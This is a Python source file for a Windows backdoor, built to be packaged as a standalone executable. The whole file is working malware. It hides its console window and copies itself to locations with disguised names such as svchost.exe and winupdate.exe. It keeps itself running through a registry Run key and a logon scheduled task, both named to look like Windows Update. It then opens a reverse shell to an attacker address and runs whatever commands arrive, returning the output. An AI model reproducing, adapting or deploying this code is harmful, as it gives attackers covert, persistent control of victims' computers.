"""
STANDALONE PERSISTENT SHELL - This will be its own EXE
"""
import socket
import subprocess
import os
import time
import sys
import winreg
import shutil
import getpass

ATTACKER_IP = "192.168.56.1"  # CHANGE THIS!
ATTACKER_PORT = 4444

def add_persistence():
    """Add to startup"""
    try:
        # Get current EXE path
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        # Copy to multiple locations
        locations = [
            os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Caches\\svchost.exe"),
            os.path.expanduser("~\\AppData\\Local\\Temp\\winupdate.exe"),
            os.path.expanduser("C:\\ProgramData\\Microsoft\\Windows\\Caches\\winservice.exe")
        ]
        
        for dest in locations:
            try:
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                shutil.copy2(exe_path, dest)
                
                # Add to registry
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{dest}"')
            except:
                pass
        
        # Add scheduled task
        try:
            task_name = "WindowsUpdateTask"
            subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
            subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc ONLOGON /ru "{getpass.getuser()}" /f', shell=True)
        except:
            pass
            
    except:
        pass

def reverse_shell():
    """Main shell"""
    add_persistence()
    
    while True:
        try:
            s = socket.socket()
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            s.send(b"\n[RED PERSISTENT SHELL - INDEPENDENT]\n$ ")
            
            while True:
                cmd = s.recv(8192).decode().strip()
                if not cmd or cmd.lower() == 'exit':
                    break
                
                if cmd.lower().startswith('cd '):
                    try:
                        os.chdir(cmd[3:])
                        s.send(f"{os.getcwd()}\n".encode())
                    except:
                        s.send(b"Error\n")
                else:
                    try:
                        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = proc.communicate(timeout=30)
                        if stdout: s.send(stdout)
                        if stderr: s.send(stderr)
                        if not stdout and not stderr: s.send(b"[OK]\n")
                    except:
                        s.send(b"Error\n")
                
                s.send(b"$ ")
            s.close()
        except:
            time.sleep(10)

if __name__ == "__main__":
    # Hide console
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    reverse_shell()